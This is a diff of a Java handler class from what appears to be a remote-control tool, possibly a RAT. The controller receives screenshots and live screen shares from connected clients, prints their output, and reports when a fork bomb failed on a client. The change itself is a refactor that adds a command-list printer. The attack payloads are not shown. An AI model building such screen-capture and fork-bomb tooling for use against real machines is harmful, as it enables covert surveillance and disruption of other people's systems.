@@ -1,37 +1,55 @@
-package main;
+package main.utils;
+
+import javafx.util.Pair;
+import main.network.ClientConnection;
+import main.network.Message;
 
 import javax.imageio.ImageIO;
-import javax.swing.*;
-import java.awt.*;
+import javax.swing.JFrame;
+import java.awt.Graphics2D;
 import java.awt.event.WindowAdapter;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.InputStream;
+import java.util.ArrayList;
+import java.util.List;
 
 public class ServerMessageHandler {
 
+    public static final String SEPARATOR = "---------------------------------------";
     private static JFrame sharedScreen;
 
-    static void handleIncomingMessage(Message message, ClientConnection c) {
+    public static void handleIncomingMessage(Message message, ClientConnection c) {
 
-        switch(message.getCommand()) {
+        switch (message.getCommand()) {
             case "screen":
                 receiveScreenshot(message);
                 break;
             case "print":
-                System.out.println(message.getArguments().get(0));
+                System.out.println(message.getArguments().get(0) +
+                        SEPARATOR);
                 break;
             case "screenshare":
                 receiveScreenShare(message, c);
                 break;
             case "bomb-fail":
                 System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
+                break;
+            case "commands":
+                printCommandList((ArrayList<Pair<String, String>>) message.getArguments().get(0));
         }
 
     }
 
+    static void printCommandList(List<Pair<String, String>> commands) {
+        for (Pair<String, String> c : commands) {
+            System.out.println("$ " + c.getKey() + " - " + c.getValue());
+        }
+        System.out.println(SEPARATOR);
+    }
+
     static void receiveScreenShare(Message message, ClientConnection c) {
-        if(sharedScreen == null) {
+        if (sharedScreen == null) {
             sharedScreen = new JFrame("ScreenShare");
             sharedScreen.addWindowListener(new WindowAdapter() {
                 @Override
@@ -75,7 +93,7 @@ public class ServerMessageHandler {
             window.add(image);
             window.update(image.getGraphics());
             window.setVisible(true);
-        } catch(Exception e) {
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
